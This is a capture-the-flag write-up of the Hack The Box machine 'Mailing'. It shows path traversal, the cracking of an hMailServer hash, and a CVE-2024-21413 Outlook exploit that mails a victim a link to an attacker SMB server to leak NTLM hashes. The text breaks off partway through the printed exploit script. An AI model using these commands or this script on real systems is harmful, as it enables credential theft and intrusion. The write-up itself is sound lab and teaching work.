---
layout: writeup
category: HTB
description: Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator.
points: 20
solves: 4999
tags: lfi hMailServer hMailServer-configuration hash-cracking outlook-vulnerabilities CVE-2024-21413 ntlm-hash libreoffice-odt-exploit CVE-2023-2255
date: 2024-09-07
title: HTB Mailing writeup
comments: false
---

{% raw %}
Mailing is an easy Windows machine that teaches the following things. First, its needed to abuse a LFI to see hMailServer configuration and have a password. Then, that creds can be used to send an email to a user with a CVE-2024-21413 payload, which consists in a smb link that leaks his ntlm hash in a attacker-hosted smb server in case its opened with outlook. This hash can be cracked and consequently used to gain access to the machine. Finally, to gain access as Administrator, I will create a malicious odt file with a CVE-2023-2255 exploit which is opened by the Administrator.

# Port recognaissance

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```python
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.15
# Nmap 7.94SVN scan initiated Mon Sep  2 12:22:57 2024 as: nmap -sS -p- --open -sVC --min-rate 5000 -v -n -Pn -oN mailing 10.10.11.14
Nmap scan report for 10.10.11.14
Host is up (0.34s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 IDLE CAPABILITY ACL QUOTA OK completed IMAP4rev1 SORT CHILDREN NAMESPACE IMAP4
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
58162/tcp open  msrpc         Microsoft Windows RPC
58724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-02T10:26:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  2 12:27:04 2024 -- 1 IP address (1 host up) scanned in 246.80 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

There are a lot of ports in this machine (25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,58162,58724). Here is a bit of explanation of each port:

**Mail related**:

- 25: SMTP, used to send emails to the server.
- 110: POP3, used to receive the emails that somebody sent to a specific user.
- 143: IMAP, same purpose of POP3, but in a different way, [check this](https://www.mailmodo.com/guides/pop3-vs-imap/) for more information.
- 465 and 587: Secure versions of SMTP.
- 993: Secure version of IMAP.

I also can see that it's [hMailServer](https://www.hmailserver.com/), which its a mail server that can be installed in windows.

**Active directory**:

- 135: Microsoft RPC.
- 139, 445: SMB, used to share files.
- 5985: WINRM, used to remotely manage a windows computer with valid credentials.

**Web**:
- 80: you already know what is a web.

Also, notice that the domain mailing.htb appears multiple times in the scan, so I will add this line at the end of my /etc/hosts for my system to know where it should resolve that domain:

```plaintext
10.10.11.14 mailing.htb
```

# Mail enumeration

There's no much thing I can do here without authentication. I can't send an email without authentication:

```bash
❯ telnet mailing.htb 25
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO x
250 Hello.
MAIL FROM: test@mailing.htb
250 OK
RCPT TO: root@mailing.htb
530 SMTP authentication is required.
```

Using the EHLO command, I can see that the only allowed auth methods are LOGIN and PLAIN:

```bash
EHLO x    
250-mailing.htb
250-SIZE 20480000
250-AUTH LOGIN PLAIN
250 HELP
```

The authentication is well-configured and I can't login as any user I want:

```bash
❯ echo -n "test" | base64 -w 0; echo
dGVzdA==
```

```bash
AUTH LOGIN
334 VXNlcm5hbWU6
dGVzdA==
334 UGFzc3dvcmQ6
dGVzdA==
535 Authentication failed. Restarting authentication process.
```

That base64 strings are just prompting for Username and password:

```bash
❯ echo -n VXNlcm5hbWU6 | base64 -d; echo
Username:
❯ echo -n UGFzc3dvcmQ6 | base64 -d; echo
Password:
```

And VRFY command (used to check if a user exists) is disabled, so I can't bruteforce valid usernames:

```bash
VRFY test
502 VRFY disallowed.
```

# Active directory enumeration

## RPC

I can't connect to the RPC server without valid credentials:

```bash
❯ rpcclient -N 10.10.11.14
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
❯ rpcclient -U "mailing.htb/%" 10.10.11.14
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

## SMB

This machine consists in a Windows Server 2019 Build 19041 without signing:

```bash
❯ netexec smb 10.10.11.14
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
```

And I don't have access to any share without credentials:

```bash
❯ netexec smb 10.10.11.14 --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] Error getting user: list index out of range
SMB         10.10.11.14     445    MAILING          [-] Error enumerating shares: [Errno 32] Broken pipe
❯ netexec smb 10.10.11.14 -u "test" -p "test" --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\test:test STATUS_LOGON_FAILURE 
❯ netexec smb 10.10.11.14 -u "guest" -p "" --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\guest: STATUS_LOGON_FAILURE 
❯ netexec smb 10.10.11.14 -u "test" -p "" --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\test: STATUS_LOGON_FAILURE 
❯ netexec smb 10.10.11.14 -u "" -p "test" --shares
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\:test STATUS_LOGON_FAILURE 
```

```bash
❯ smbclient -N -U "test" -L mailing.htb
session setup failed: NT_STATUS_LOGON_FAILURE
❯ smbclient -N -U "guest" -L mailing.htb
session setup failed: NT_STATUS_LOGON_FAILURE
```

Nothing interesting here.

# Web enumeration
            
Taking a look with curl, I can see it consists in a Microsoft-IIS/10.0 and its programmed in ASP.NET. Also, it redirects to mailing.htb, which I have already added to my `/etc/hosts` file:

```bash
❯ curl -i -s http://10.10.11.14
HTTP/1.1 301 Moved Permanently
Content-Type: text/html; charset=UTF-8
Location: http://mailing.htb
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Mon, 02 Sep 2024 14:55:43 GMT
Content-Length: 152

<head><title>Documento movido</title></head>
<body><h1>Objeto movido</h1>Este documento puede encontrarse aquí <a HREF="http://mailing.htb"></a></body>
```

In the browser, it talks about their mail server. There are also some usernames and instructions on how to use it:

![main page](/assets/images/Mailing/main-page.png)

Here also says its using hMailServer, but I saw it before on the nmap scan.

The "Download Instructions" link gives instructions on how to use the server:

![mail instructions](/assets/images/Mailing/mail-instructions.png)

It just gives instructions on how to use different clients  like Thunderbird and Windows Mail to use their mail server.

From this pdf I extracted two things. 

It uses user:password combination for the example:

![user password combination](/assets/images/Mailing/user-password-configuration.png)

But it doesn't works in mail (it would be incredible if this was the case):

```bash
❯ telnet mailing.htb 25
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO x
250 Hello.
AUTH LOGIN
334 VXNlcm5hbWU6
user
334 UGFzc3dvcmQ6
password
535 Authentication failed. Restarting authentication process.
```

Also, I can extract a username, maya:

![message to maya](/assets/images/Mailing/message-to-maya.png)

Nothing more interesting here.

Another thing I have to notice is the link of "Download instructions", which takes the '?file' parameter:

![download instructions link](/assets/images/Mailing/download-instructions-link.png)

And it retrieves the response of the file specified:

![file response](/assets/images/Mailing/contents-of-file-in-download-response.png)

This could be dangerous if its bad programmed because I could retrieve files of the machine:

## Path traversal

As I saw before, the download.php takes a parameter ?file and returns the contents of a file specified. What if I put ../ until it's in the file system root and put any system file I want? I will try C:/Windows/System32/drivers/etc/hosts, which is a typical file in windows that does the same as `/etc/hosts` in linux:

![etc hosts contents in windows](/assets/images/Mailing/etc-hosts-contents-windows.png)

It works and retrieves the contents, so I have confirmed a "Path traversal" vulnerability.

As its a windows machine, I could try to see if I can connect to my SMB server for receiving a hash:

```bash
❯ smbserver.py -smb2support test $(pwd)
Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![try smb connection](/assets/images/Mailing/try-smb-connection.png)

But I don't receive anything:

![smb server nothing received](/assets/images/Mailing/smbserver-nothing-received.png)

However, as the server uses hMailServer for mail, I will look at its configuration file. 

For that, I will install hMailServer from [here](https://www.hmailserver.com/download) in a Windows VM to see where the configuration file is located.

Searching a bit after installing it, I can see a configuration file called hMailServer.INI located in `C:\Program Files (x86)\hMailServer\Bin`, which has hashed passwords:

![password in hmailserver.ini](/assets/images/Mailing/password-in-hmailserver.ini.png)

In the installation, I specified the password `test123` so I will see if cracking it with john its the same:

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt myHmailServerAdministratorPassword.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
test123          (?)     
1g 0:00:00:00 DONE (2024-09-02 19:31) 100.0g/s 1766Kp/s 1766Kc/s 1766KC/s goarmy..ellie123
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

And its the case. 

The other password in the "Password" field doesn't seem crackable and I don't know how was generated:

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt myHmailServerDBPassword.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-09-02 19:39) 0g/s 14786Kp/s 14786Kc/s 14786KC/s  fuckyooh21..*7¡Vamos!
Session completed. 
```

I will look at that file in the path traversal vulnerability:

![hMailServer.ini in path traversal](/assets/images/Mailing/hMailServer.ini-in-path-traversal.png)

And I can take the hashed password of Administrator user. Cracking it success and gives me the password 'homenetworkingadministrator':

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt administrator-mail.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
homenetworkingadministrator (?)     
1g 0:00:00:00 DONE (2024-09-02 19:44) 1.886g/s 14268Kp/s 14268Kc/s 14268KC/s homerandme..homejame
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

This password doesn't works for SMB:

```bash
❯ netexec smb 10.10.11.14 -u "Administrator" -p "homenetworkingadministrator"
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\Administrator:homenetworkingadministrator STATUS_LOGON_FAILURE 
```

I will try with the different possible combinations of the users I saw in the webpage but nothing:

```bash
❯ /bin/cat users.txt
maya bendito
ruy alonso
gregory smith
❯ /opt/username-anarchy/username-anarchy -i users.txt > users-to-test.txt
```

```bash
❯ netexec smb 10.10.11.14 -u users-to-test.txt -p 'homenetworkingadministrator' -t 3
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [-] MAILING\maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\mayabendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\maya.bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\mayabend:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\mayab:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\m.bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\mbendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\bmaya:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\b.maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\benditom:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito.m:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito.maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\mb:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruy.alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalons:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalon:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ruya:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\r.alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ralonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\aruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\a.ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\alonsor:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso.r:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso.ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\ra:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gregorysmith:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gregory.smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gregorys:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gregsmit:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\g.smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gsmith:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\sgregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\s.gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\smithg:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\smith.g:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\smith.gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
SMB         10.10.11.14     445    MAILING          [-] MAILING\gs:homenetworkingadministrator STATUS_LOGON_FAILURE
```

However, it does work in the mail server (that's why I saw it in the hMailServer.ini):

```bash
❯ echo -n 'homenetworkingadministrator' | base64 -w 0; echo
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
❯ echo -n 'Administrator@mailing.htb' | base64 -w 0; echo
QWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
```

```bash
❯ telnet mailing.htb 25
Trying 10.10.11.14...
Connected to mailing.htb.
Escape character is '^]'.
220 mailing.htb ESMTP
HELO mailing.htb
250 Hello.
AUTH LOGIN
334 VXNlcm5hbWU6
QWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
334 UGFzc3dvcmQ6
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
235 authenticated.
```

Now I can send messages as Administrator to any user. I saw that user maya was valid before and that she could be using Outlook.

# Access as maya

Outlook had a vulnerability that became so popular identified as [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413), which is described as a Remote Code Execution vulnerability:

![CVE-2024-21413](/assets/images/Mailing/CVE-2024-21413.png)

However looking at [this research](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/) I taked from the nvd page, I can see that its more a filter bypass. Normally, outlook advertises when a link is dangerous:

![normally outlook advertises link](/assets/images/Mailing/normally-outlook-advertises-link.png)

But apparently putting an exclamation mark the filter is bypassed:

![bypass outlook restriction exclamation mark](/assets/images/Mailing/bypass-outlook-restriction-exclamation-mark.png)

This could be used for an attacker to retrieve the ntlm hash of an user that opens a link that points to an attacker-hosted smbserver.

Looking for exploits, I saw [this one](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) that it logins with the specified username and password, starts TLS encryption and sends the email to the specified username:

![exploit outlook](/assets/images/Mailing/exploit-outlook.png)

I will clone it:

```bash
❯ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 14.48 KiB | 336.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
❯ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

The html message is too suspicious. Its not necessary for this machine but to act as a more advanced attacker, I will change the title to "Congratulations. You won an iPhone 15.", resulting like this:

```python
html = f"""\
    <html>
    <body>
        <h1><a href="file:///{link_url}!poc">Congratulations. You won an iPhone 15.</a></h1>
    </body>
    </html>
    """
```

I will use the exploit with the url of my hosted smb server to leak the ntlm hash. For that, I need to start an smbserver first:

```bash
❯ mkdir smbserver
❯ cd smbserver
❯ echo 'hello' > test.txt
❯ smbserver.py -smb2support test $(pwd)
Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now run the exploit:

```bash
❯ python3 CVE-2024-21413.py --server mailing.htb --port 25 --username 'Administrator@mailing.htb' --password homenetworkingadministrator --sender 'Administrator@mailing.htb' --recipient 'maya@mailing.htb' --url '\\10.10.14.106\test\test.txt' --subject 'Congratulations maya!'

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

❌ Failed to send email: STARTTLS extension not supported by server.
```

But it says STARTTLS not supported so I will remove the line that does. This is the resulting exploit:

```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import argparse
import sys

BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
ENDC = "\033[0m"

def display_banner():
    banner = f"""
{BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
"""
    print(banner)

def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):

    """Sends an email with both plain text and HTML parts, including advanced features."""
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email

    text = "Please read this email in HTML format."
    base64_image_string = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANgAAAAuCAYAAABK69fpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTMyIDc5LjE1OTI4NCwgMjAxNi8wNC8xOS0xMzoxMzo0MCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTAwQkM2Mzk4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTAwQkM2Mzg4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoV2luZG93cykiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMkM5MzFBNDcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMkM5MzFBNTcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgQJy/MAAAxESURBVHja7FwNlFVVFT6PN8MMM8AIjPxomEyggCYgajIaguCkaC5AEocif9CIiLLyp9IMC9NgVRqrGpMSwcFSIs3URHERJoJCSlIgMQk0YCS/MjAww8zrbO/36rz99rnvzpt3Z6Z551trL5hz3z3n3HPO/t/3Rg6NL6lXIeCWXhfk0r99Ji05Hkb/IxojI8vK6lfbrk+fPl05OLQ2OrglcHBwDObg4BjMwcHBMZiDg2MwBwfHYA4ODr7IaW8PNOfliNryeKnqpM50u+vQXJRoGqlpmKZiTUc0HdT0hKa1Wclg+9/urWqqe6pOPf8vpjtYU39Nb4Mc2g6+oukWTSdZLL/sZLDDu4tU/ZE82+VZmko1NQgL9oymymYMPUTT7ZoaWXtU0wuafmm00QS/p+kLmvIhGedpmu3OdauDCiR+gLNiw7GsNRE75DSqSIeY7fJYTVdarp2u6TeajqY5NDFXueXaUcZgozV91fi7QNNdml7U9Cd3xlsVs1IwV1xAZieDpYCf5DlD0wWaVqTRbz9Nl/hcr2N/jxJ+E8H4jsFaD700fVFo365pIfwvcu7/xq53hWV0tqalmrZkK4OlkkrXpMlgE+EEB8V6S/tf3Ta0KiiYcSpre1fT5WxvOkAgfkLTJAjG09D+sslgLkyfiAlNZJQ4Y05t4j2/1/QQa7tf0x/cFr